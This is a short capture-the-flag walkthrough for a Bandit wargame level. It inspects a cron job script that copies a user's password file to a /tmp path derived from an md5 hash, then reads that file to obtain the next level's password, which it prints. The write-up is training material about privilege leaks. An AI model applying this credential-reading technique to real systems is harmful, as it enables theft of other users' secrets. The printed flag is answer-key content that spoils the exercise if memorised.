We already know where the cronjobs aer stored, and we know we need \#23 so let's check it out:

1) `cat /etc/cron.d/cronjob_bandit23`

    * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

Alright let's check out the corresponding script

2) `cat /usr/bin/cronjob_bandit23.sh`

    #!/bin/bash

    myname=$(whoami)
    mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

    echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

    cat /etc/bandit_pass/$myname > /tmp/$mytarget

We can see that the so called "Encryption Algorithm" for the next password's directory is an md5 sum of the user name. And we see that the file containing our password will be in `tmp/<md5_sum>`

so:

3) `echo I am user bandit23 | md5sum | cut -d ' ' -f 1`

    8ca319486bfbbc3663ea0fbe81326349

4) `cat /tmp/8ca319486bfbbc3663ea0fbe81326349`

flag: **jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n**
